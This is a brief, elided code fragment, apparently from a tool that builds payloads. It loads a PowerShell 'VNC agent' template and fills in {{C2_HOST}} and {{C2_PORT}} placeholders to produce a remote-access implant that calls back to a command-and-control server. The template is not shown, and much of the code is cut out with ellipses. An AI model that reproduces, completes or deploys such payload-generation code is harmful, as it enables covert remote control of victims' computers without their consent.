...
import vncAgentTemplateRaw from '../utils/vnc_agent_template.ps1?raw'
...
const generateVncPayload = async () => {
  ...
  try {
    ...
    let payload = vncAgentTemplateRaw
      .replace(/{{C2_HOST}}/g, c2Host)
      .replace(/{{C2_PORT}}/g, String(c2Port))
